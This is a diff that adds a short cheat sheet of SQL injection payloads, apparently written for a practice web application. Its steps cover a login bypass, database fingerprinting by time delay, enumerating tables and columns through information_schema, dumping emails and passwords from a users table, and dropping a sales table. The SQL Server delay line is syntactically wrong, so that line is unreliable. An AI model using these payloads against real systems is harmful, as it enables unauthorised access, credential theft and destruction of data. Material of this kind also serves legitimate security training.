@@ -1,0 +1,18 @@
+//login
+' OR 1=1;--
+
+// To check if using MySQL or SQL server
+Milk%' AND 0=SLEEP(2);-- //for MySQL
+Milk%' AND 0=DELAY(2);-- // for SQL server
+
+//For getting Table Names along with Database Names
+' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 1 FROM information_schema.tables);--
+
+//For getting coulmn names of a specific table
+' UNION (SELECT COLUMN_NAME, 1, 1 FROM information_schema.columns WHERE TABLE_NAME = 'users');--
+
+//After getting all the information
+' UNION (SELECT Email, Password, Type FROM users);--  
+
+//Drop table
+';DROP TABLE sales;--
